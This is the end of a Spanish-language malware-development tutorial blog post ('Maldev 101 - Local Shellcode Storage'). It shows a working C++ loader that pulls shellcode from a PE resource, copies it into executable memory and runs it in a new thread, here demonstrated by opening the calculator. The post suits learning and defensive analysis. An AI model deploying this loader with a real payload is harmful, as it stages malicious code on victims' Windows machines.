</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#75715e">// Obtiene la localización del recurso mediante su ID: IDR_RCDATA1
</span><span style="color:#75715e"></span>    HRSRC hRsrc <span style="color:#f92672">=</span> FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);

    <span style="color:#75715e">// Handle al recurso
</span><span style="color:#75715e"></span>    HGLOBAL hGlobal <span style="color:#f92672">=</span> LoadResource(NULL, hRsrc);

    <span style="color:#75715e">// Puntero al recurso
</span><span style="color:#75715e"></span>    PVOID pShellcodeAdd <span style="color:#f92672">=</span> LockResource(hGlobal);

    <span style="color:#75715e">// Tamaño del recurso
</span><span style="color:#75715e"></span>    SIZE_T sShellcodeSize <span style="color:#f92672">=</span> SizeofResource(NULL, hRsrc);


    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] pShellcodeAdd: 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> pShellcodeAdd <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] sShellcodeSize: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> sShellcodeSize <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
    
    <span style="color:#75715e">// Asigna un nuevo espacio de memoria con permisos de ejecución de nuestra Shellcode
</span><span style="color:#75715e"></span>    PVOID execShellcode <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, sShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy(execShellcode, pShellcodeAdd, sShellcodeSize);

    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[#] execShellcode: 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> pShellcodeAdd <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39;\n&#39;</span>;

    <span style="color:#75715e">// Crea un nuevo hilo para ejecutarlo
</span><span style="color:#75715e"></span>    CreateThread(NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)execShellcode, NULL, <span style="color:#ae81ff">0</span>, NULL);
    Sleep(<span style="color:#ae81ff">10</span>);

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Al debuggear nuestro ejecutable con Visual Studio, podemos ver que nuestra variable <em>execShellcode</em> contiene nuestra <em>shellcode</em>, y una vez ejecutada la función <em>CreateThread</em>, se abre nuestra calculadora:</p>
<p><img loading="lazy" src="../assets/posts/shellcode-storage/r9.png" srcset="/../assets/posts/shellcode-storage/r9.png, ../assets/posts/shellcode-storage/r9.png 1.5x, /../assets/posts/shellcode-storage/r9.png 2x" sizes="auto" data-title="/../assets/posts/shellcode-storage/r9.png" data-alt="/../assets/posts/shellcode-storage/r9.png" width="1194" height="519" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h3 id="referencias">Referencias</h3>
<ul>
<li><a href="https://0xrick.github.io/win-internals/pe5/#sections"target="_blank" rel="external nofollow noopener noreferrer">https://0xrick.github.io/win-internals/pe5/#sections</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/menurc/finding-and-loading-resources"target="_blank" rel="external nofollow noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/menurc/finding-and-loading-resources</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/menurc/using-resources"target="_blank" rel="external nofollow noopener noreferrer">https://learn.microsoft.com/en-us/windows/win32/menurc/using-resources</a></li>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources"target="_blank" rel="external nofollow noopener noreferrer">https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources</a></li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2023-06-21 13:12:15">Updated on 2023-06-21&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/local-shellcode-storage/local-shellcode-storage/" data-title="Maldev 101 - Local Shellcode Storage" data-via="jagelit0" data-hashtags="malware,shellcode,windows"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/local-shellcode-storage/local-shellcode-storage/" data-hashtag="malware"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/local-shellcode-storage/local-shellcode-storage/" data-title="Maldev 101 - Local Shellcode Storage" data-image="../assets/posts/shellcode-storage/test1.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/malware/' class="post-tag">malware</a><a href='/tags/shellcode/' class="post-tag">shellcode</a><a href='/tags/windows/' class="post-tag">windows</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/seal-htb/seal-htb/" class="post-nav-item" rel="prev" title="Seal HTB Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Seal HTB Writeup</a></div>
</div>
</article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
  </noscript>
</div><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e rottenbytes"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
